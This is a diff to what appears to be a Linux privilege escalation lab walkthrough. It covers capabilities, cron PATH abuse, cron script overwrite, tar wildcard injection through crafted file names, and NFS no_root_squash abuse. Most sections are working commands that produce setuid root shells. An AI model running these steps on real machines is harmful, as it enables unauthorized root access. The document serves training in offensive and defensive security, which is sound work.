@@ -183,11 +183,100 @@ Linux VM
 1. In command prompt type: getcap -r / 2>/dev/null
 2. From the output, notice the value of the “cap_setuid” capability.
 
-Exploitation
+### Exploitation
 
-### Linux VM
+Linux VM
 
 1. In command prompt type:
 ```
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
+## Task 15 Cron (Path)
+
+### Detection
+
+Linux VM
+
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the value of the “PATH” variable.
+
+### Exploitation
+
+Linux VM
+
+1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+2. In command prompt type: chmod +x /home/user/overwrite.sh
+3. Wait 1 minute for the Bash script to execute.
+4. In command prompt type: /tmp/bash -p
+5. In command prompt type: id
+
+## Cron (Wildcards)
+
+### Detection
+
+Linux VM
+
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the script “/usr/local/bin/compress.sh”
+3. In command prompt type: cat /usr/local/bin/compress.sh
+4. From the output, notice the wildcard (*) used by ‘tar’.
+
+### Exploitation
+
+Linux VM
+
+1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
+2. touch /home/user/--checkpoint=1
+3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+4. Wait 1 minute for the Bash script to execute.
+5. In command prompt type: /tmp/bash -p
+6. In command prompt type: id
+
+## Cron (File Overwrite)
+
+### Detection
+
+Linux VM
+
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the script “overwrite.sh”
+3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
+4. From the output, notice the file permissions.
+
+### Exploitation
+
+Linux VM
+
+1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+2. Wait 1 minute for the Bash script to execute.
+3. In command prompt type: /tmp/bash -p
+4. In command prompt type: id
+
+## NFS Root Squashing
+
+### Detection
+
+Linux VM
+
+1. In command line type: cat /etc/exports
+2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
+
+### Exploitation
+
+Attacker VM
+
+1. Open command prompt and type: showmount -e 10.10.178.251
+2. In command prompt type: mkdir /tmp/1
+3. In command prompt type: mount -o rw,vers=2 10.10.178.251:/tmp /tmp/1
+In command prompt type:
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
+5. In command prompt type: chmod +s /tmp/1/x
+
+Linux VM
+
+1. In command prompt type: /tmp/x
+2. In command prompt type: id
